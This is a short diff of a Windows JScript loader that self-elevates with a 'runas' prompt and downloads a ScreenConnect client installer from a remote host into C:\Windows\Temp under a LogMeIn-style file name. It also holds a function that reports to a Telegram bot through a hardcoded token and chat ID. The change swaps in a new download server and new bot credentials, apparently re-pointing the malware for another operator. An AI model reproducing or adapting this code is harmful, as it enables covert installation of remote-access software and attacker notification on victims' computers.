@@ -4,7 +4,7 @@
         shell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\" elevated", "", "runas", 1);
         WScript.Quit(0);
     }
-    var msiUrl = "https://ftn.dinentoni.org/Bin/dinentoni.ClientSetup.msi?e=Access&y=Guest";
+    var msiUrl = "http://3v4t06xc6qcm5k8:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
     var destPath = "C:\\Windows\\Temp\\LogMeInResolve_Unattended.msi";
     var destFolder = "C:\\Windows\\Temp";
     var logFile = "C:\\Windows\\Temp\\LogMeIn_Install.log";
@@ -25,8 +25,8 @@
 }
 function sendTelegramMessage(message)
 {
-var botToken  = '7971091621:AAHY0PxnYn0HQMUS3NdfONweMoto7vhXMRw';
-var chatId = '6047975718';
+var botToken  = '8762919252:AAEixqSJqJTsgKm6llvvRoMH1rCtEFgKj8c';
+var chatId = '7763496441';
 
     var url = "https://api.telegram.org/bot" +
         botToken +
